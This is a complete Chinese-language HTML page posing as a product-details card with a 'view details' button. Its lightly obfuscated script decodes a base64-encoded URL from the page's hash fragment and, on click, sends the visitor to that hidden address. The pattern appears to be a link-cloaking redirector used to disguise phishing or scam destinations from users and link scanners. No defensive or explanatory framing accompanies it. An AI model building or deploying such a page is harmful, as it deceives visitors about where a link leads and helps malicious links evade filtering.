<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>资源加载中</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;justify-content:center;align-items:center}
.card{width:90%;max-width:380px;background:#fff;border-radius:16px;box-shadow:0 2px 12px rgba(0,0,0,.06);overflow:hidden}
.card-img{width:100%;height:180px;background:linear-gradient(135deg,#e8f0fe,#d4e4fc);display:flex;align-items:center;justify-content:center;color:#1677FF;font-size:48px}
.card-body{padding:20px}
.card-body h2{font-size:17px;color:#222;margin-bottom:8px}
.card-body p{font-size:13px;color:#888;line-height:1.6;margin-bottom:10px}
.card-foot{padding:0 20px 20px;display:flex;justify-content:center}
.card-foot span{display:inline-block;padding:10px 36px;background:linear-gradient(135deg,#1677FF,#4096FF);color:#fff;border-radius:24px;font-size:15px;font-weight:600;cursor:pointer;user-select:none;text-decoration:none}
</style>
</head>
<body>
<div class="card">
  <div class="card-img">&#128722;</div>
  <div class="card-body">
    <h2 id="t1">商品详情</h2>
    <p>请确认信息后继续操作</p>
  </div>
  <div class="card-foot">
    <span id="go" onclick="go()">查看详情</span>
  </div>
</div>
<script>
(function(){
  var _0=document['getElementById'];
  var _r=location['hash']||'';
  if(!_r)return;
  try{
    var _d=atob(_r['substring'](1));
    var _u=decodeURIComponent(_d);
    if(/^https?:\/\//['test'](_u)){
      var _b=_0('go');
      _b['setAttribute']('data-u',_u);
      _0('t1')['textContent']='商品已准备好';
    }
  }catch(e){}
})();
function go(){
  var _u=document['getElementById']('go')['getAttribute']('data-u');
  if(_u)location['href']=_u;
}
</script>
</body>
</html>
